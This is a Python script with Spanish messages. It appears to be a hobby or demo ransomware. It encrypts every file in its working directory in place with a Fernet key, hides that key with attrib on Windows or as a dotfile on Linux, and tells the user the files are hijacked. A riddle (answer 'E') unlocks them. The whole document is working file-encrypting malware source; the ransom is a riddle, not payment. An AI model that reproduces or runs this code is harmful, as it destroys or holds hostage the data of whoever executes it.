import os
from cryptography.fernet import Fernet, InvalidToken
import platform

files = []

for file in os.listdir():
    if (
        file == "key.key"
        or file == ".key.key"
        or file == "main.py"
        or file == "setup.py"
        or file == "REAME.MD"
        or file == "requirements.txt"
        or file == "static"
        or file == "venv"
    ):
        continue
    if os.path.isfile(file):
        files.append(file)

# print(files)

sistema_operativo = platform.system()

if sistema_operativo == "Linux":  # Verifica si el sistema operativo es Linux
    filename = "./.key.key"
else:
    filename = "./key.key"

if os.path.exists(filename):
    # El archivo existe
    # print(f"El archivo {filename} existe en el directorio actual. Leyendo llave")

    with open(filename, "rb") as key_file:
        key = key_file.read()
    # print(f"key in ${sistema_operativo} is :", key)

else:
    # El archivo no existe
    # print(f"El archivo {filename} no existe en el directorio actual. Generando llave")

    key = Fernet.generate_key()
    with open(filename, "wb") as keyfile:
        keyfile.write(key)

    if sistema_operativo == "Windows":
        os.system("attrib +s +h key.key")

    # print("key generate is:", key)


def encrypter(key):
    for file in files:
        with open(file, "rb") as the_file:
            contents = the_file.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as the_file:
            the_file.write(contents_encrypted)
        # print("the file", file, "is encrypted")


def decrypter(key):
    for file in files:
        with open(file, "rb") as the_file:
            contents = the_file.read()
        contents_decrypted = Fernet(key).decrypt(contents)
        with open(file, "wb") as the_file:
            the_file.write(contents_decrypted)
        # print("the file ", file, " is decrypted")


response = "E"


# Función para verificar si un archivo está cifrado con Fernet
def verify_files(key):
    try:
        decrypter(key)
        print("Archivos cifrados!")
        encrypter(key)
        print(
            "Responde a la siguiente adivinanza, si aciertas recuperaras tus archivos"
        )
        print(
            "Soy el principio de la eternidad, el tercero de cada cuento, vivo donde comienza en el espacio y existo en mitad del tiempo. ¿Quién soy?"
        )

        while True:
            response = input("Cual es tu respuesta :")
            if response == "E":
                print("Respuesta correcta, archivos desencriptados!")
                decrypter(key)
                break
            print("Respuesta incorrecta, prueba de nuevo!")

    except InvalidToken:
        print("Archivos secuestrados!")
        encrypter(key)
        print(
            "Responde a la siguiente adivinanza, si aciertas recuperaras tus archivos"
        )
        print(
            "Soy el principio de la eternidad, el tercero de cada cuento, vivo donde comienza en el espacio y existo en mitad del tiempo. ¿Quién soy?"
        )

        while True:
            response = input("Cual es tu respuesta :")
            if response == "E":
                print("Respuesta correcta, archivos desencriptados!")
                decrypter(key)
                break
            print("Respuesta incorrecta, prueba de nuevo!")

    except Exception as e:
        print(f"Ocurrió un error: {e}")


verify_files(key)
